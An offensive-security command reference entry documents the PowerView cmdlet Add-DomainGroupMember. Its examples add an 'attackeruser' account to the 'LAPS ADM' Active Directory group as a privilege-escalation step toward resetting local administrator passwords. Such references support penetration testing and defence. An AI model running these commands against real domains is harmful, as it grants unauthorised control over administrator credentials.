---
type: command
executor: powershell
data: >-
  Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred
  -Domain "domain.local"
output: null
created_at: '2023-04-06T03:56:04.524544+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - active-directory
  - group-manipulation
verified: true
validated: true
---

# Add-DomainGroupMember-to-LAPS-ADM-Group

## Command

```powershell
Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'user1' -Credential $cred -Domain "domain.local"
```

## Description

This PowerShell command, from the PowerView module, adds a specified user to the LAPS ADM group in Active Directory, granting permissions to reset LAPS-managed local administrator passwords. Use this during privilege escalation when targeting LAPS-enabled environments to prepare for password management.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Identity | Name of the target group (e.g., 'LAPS ADM') | Yes |
| -Members | Username(s) to add (e.g., 'user1') | Yes |
| -Credential | PSCredential object for authentication (e.g., from Get-Credential) | Yes |
| -Domain | Target domain FQDN (e.g., "domain.local") | Yes |

## Examples

### Basic Usage

```powershell
Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'attackeruser' -Credential $domainCred -Domain "corp.example.com"
```

### Advanced Usage

```powershell
Add-DomainGroupMember -Identity 'LAPS ADM' -Members 'attackeruser', 'backupuser' -Credential $domainCred -Domain "corp.example.com" -Verbose
```

## Expected Output

Successful execution returns the group object or a confirmation message like "User added successfully." Errors include "Access Denied" if credentials lack rights, or "Group not found" if LAPS groups are not configured.

## Related

- [[commands/Add-DomainGroupMember-to-LAPS-READ-Group]]
- [[procedures/Retrieve-LAPS-Password-via-Group-Manipulation]]
